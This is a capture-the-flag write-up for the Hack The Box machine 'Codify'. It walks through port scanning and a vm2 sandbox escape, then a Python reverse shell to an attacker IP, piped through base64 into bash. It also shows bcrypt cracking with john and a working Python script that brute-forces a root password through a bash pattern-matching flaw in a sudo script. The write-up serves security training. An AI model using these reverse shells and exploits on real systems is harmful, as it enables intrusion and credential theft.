![Codify](https://github.com/amalcew/htb-writeups/assets/73908014/b693185b-6355-4761-9f5c-902ed6282a52)

## Reconnaissance & port scanning

Initial port scan revealed open ports 22, 80 and 3000 used by some node.js instance

```bash
# Nmap 7.94SVN scan initiated Wed Mar  6 11:57:07 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.239
Nmap scan report for codify.htb (10.10.11.239)
Host is up, received syn-ack (0.066s latency).
Scanned at 2024-03-06 11:57:08 CET for 19s
Not shown: 992 closed tcp ports (conn-refused), 5 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Codify
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar  6 11:57:27 2024 -- 1 IP address (1 host up) scanned in 19.26 seconds
```

After adding proper entry to `/etc/hosts` the webpage inspection was performed.

![01-codify](https://github.com/amalcew/htb-writeups/assets/73908014/8f00da85-db83-44fc-a081-b835f9aac67d)

![02-about](https://github.com/amalcew/htb-writeups/assets/73908014/e4ad795f-31e1-4be9-ac83-5bcd2f132ca6)

Apperantly, the machine hosts node.js sandbox using `vm2` library. Following the link we can discover, that the webpage leaks the version of the library, which is `3.9.16`.

Searching for potential vulnerabilities, I've came across [CVE-2023-29199](https://nvd.nist.gov/vuln/detail/CVE-2023-29199) that allows the threat actor to escape the vm2 sandbox by abusing the exception sanitization.
This behaviour was described in the [paper](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) that also explains simple proof of concept.

Checking the POC on tested website we can confirm, that the website is indeed vulnerable:

![03-rce](https://github.com/amalcew/htb-writeups/assets/73908014/d81c1d77-be96-4d5f-8f13-5824712f1ed3)

## Initial foothold

Because the website is vulnerable to remote code execution, next step is to gain initial foothold. 
The exploitation process was straightforward, as it required using proper reverse shell. In case of this machine, reverse shell was achieved using Python:

```bash
> cat reverse_shell.sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

> cat reverse_shell.sh | base64 -w 0
cHl0aG9u ... SNIP ... Il0pOycK
```

To execute this shell we need to decode it on the machine and execute, which makes the final payload:

```bash
echo cHl0aG9u ... SNIP ... Il0pOycK | base64 -d | /bin/bash;
```

Executing the payload on the machine we receive the connection on selected port:

![04-reverse_shell](https://github.com/amalcew/htb-writeups/assets/73908014/6a83a909-e7c8-4ea2-86c1-58f134d6167a)

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.239] 34166
bash: cannot set terminal process group (1254): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

## Escalating privileges and obtaining user flag

After stabilising the shell, I've conducted the analysis of the environment. Searching for potential vector of privilege escalation, I've found the directory `/var/www` used by the node.js sandbox. Folder `contact` contained some interesting positions:

```bash
svc@codify:/var/www/contact$ ls
index.js  package.json  package-lock.json  templates  tickets.db
```

The most interesting file is the `tickets.db` that look like a Sqlite3 database. Source code stored in `index.js` confirms that this is indeed Sqlite3:

```bash
svc@codify:/var/www/contact$ head index.js 
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const session = require('express-session');
const app = express();
const port = 3001;

// create a new database and table
const db = new sqlite3.Database('tickets.db');
db.run('CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)');
```

The database contains hashed password of `joshua` user:

```bash
svc@codify:/var/www/contact$ sqlite3 tickets.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> select * from users;
3|joshua|$2a$***************************************************p/Zw2
```

Using `john` to crack the hash we obtain the password:

```bash
└─$ john hash --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s********1       (?)    
1g 0:00:00:25 DONE (2024-03-06 18:00) 0.03921g/s 53.64p/s 53.64c/s 53.64C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

With password I've been able to ssh into the machine and read the user flag:

```bash
└─$ ssh joshua@10.10.11.239
joshua@10.10.11.239's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar  6 05:06:04 PM UTC 2024

  System load:                      0.21630859375
  Usage of /:                       64.5% of 6.50GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        253
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Mar  6 17:06:05 2024 from xx.xx.xx.xx
joshua@codify:~$ cat user.txt 
1e****************************94
```

## Root privileges escalation and final flag

Searching for scripts with `sudo -l` I've found a script called `mysql-backup.sh` used for making a database backup:

```bash
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

The code of this script presents as follows:

```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The script contains vulnerability in password handling method, which utilizes bash pattern comparison (double equals mark `==` in square brackets `[[ ]]`). This method compares the string to pattern, rather than string to string as it should be handled. Passing asterisk `*` as input:

```bash
joshua@codify:~$ /opt/scripts/mysql-backup.sh
/usr/bin/cat: /root/.creds: Permission denied
Enter MySQL password for root: 
Password confirmed!
Enter password: 
```

fullfils the pattern requirement and echoes the message of successful authentication. Threat actor can abuse this behavior by brute forcing the script, simply by using bash pattern mechanic - for example, if root password is `abcd1234` input of `a*`, `ab*` (and so on) will trigger the pattern.

With this knowledge I've wrote simple Python script, which brute forces the password:

```python
import subprocess

charset = [chr(i) for i in range(ord('a'), ord('z')+1)] + [chr(i) for i in range(ord('0'), ord('9')+1)]  # generate list of chars and digits
target = '/opt/scripts/mysql-backup.sh'
ACK = 'Password confirmed!'

def check(pswd):
    cmd = f'echo {pswd}* | sudo {target}'
    feedback = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
    if ACK in feedback:  # check if feedback contains keywords
        return True
    else:
        return False

password = str()

while True:
    for char in charset:
        if check(password + char):  
            password += char
            break
    else:
        print(f'password: {password}')
        break
```

executing the exploit, we get the root password

```bash
joshua@codify:~$ python3 exploit.py
password: kljh*************kjh3
```

which we can use to login into root and read root flag:

```bash
joshua@codify:~$ su - root
Password: 
root@codify:~# cat /root/root.txt 
edba************************de60
```
